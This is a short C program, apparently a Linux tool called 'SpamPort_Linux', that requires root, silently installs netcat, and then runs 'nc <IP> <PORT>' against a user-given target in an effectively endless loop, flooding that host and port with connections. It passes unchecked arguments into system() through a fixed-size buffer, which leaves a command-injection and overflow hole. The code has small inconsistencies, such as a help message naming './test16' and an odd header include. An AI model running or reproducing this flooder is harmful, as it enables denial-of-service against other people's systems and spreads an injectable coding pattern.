//Code by 6icada
//Please do not copy code

//Adding libraries
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <zconf.h>

//Main function
int main(int argc, char *argv[]){
	//Adding vars
	char cmd[150];
	int x = getuid();

	//Checking Root Access
	if(x == 0){
		//Checking argc and argv[]
		if(argc == 1){
			//MSG
			printf("Type \"./SpamPort_Linux -h\" for help\n");
		}
		else if(argc == 2){
			//String compare
			if(strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "--help") == 0){
				//MSG
				printf("Usage: \"./test16 <IP> <PORT>\"\n");
			}
		        else{
				//MSG
				printf("ERROR!!!\n");
			}
		}
		else if(argc == 3){
			//Starting Action
			system("apt install netcat -y > /dev/null");

			sprintf(cmd, "nc %s %s -v -w 0", argv[1], argv[2]);
			//Starting Spam
			for(int x = 10; x > 5; x++){
				system(cmd);
			}
		}
	}
	else{
		//Warning
		printf("\n\nI do not have root access!!!\n\n");
	}
}
